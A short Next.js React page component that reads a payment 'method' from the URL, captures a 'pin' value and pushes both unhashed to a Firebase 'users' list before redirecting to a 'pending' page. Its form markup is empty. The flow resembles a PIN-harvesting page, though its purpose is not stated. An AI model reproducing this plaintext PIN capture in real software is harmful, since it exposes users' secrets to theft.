"use client";
import { useState } from "react";
import { ref, push } from "firebase/database";
import { database } from "@/app/lib/firebase";
import { useRouter, useSearchParams } from "next/navigation";

export default function Page() {
  // Changed from "page" to "Page"
  const router = useRouter();
  const searchParams = useSearchParams();
  const method = searchParams.get("method");

  const [formData, setFormData] = useState({
    method: method,
    pin: "",
  });

  const handleChange = (e) => {
    let { name, value } = e.target;

    setFormData({
      ...formData,
      [name]: value,
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const formRef = ref(database, "users");
    await push(formRef, formData);
    router.push("/pending");
    setFormData({
      method: method,
      pin: "",
    });
  };

  return (
    <div>
      
    </div>
  );
}
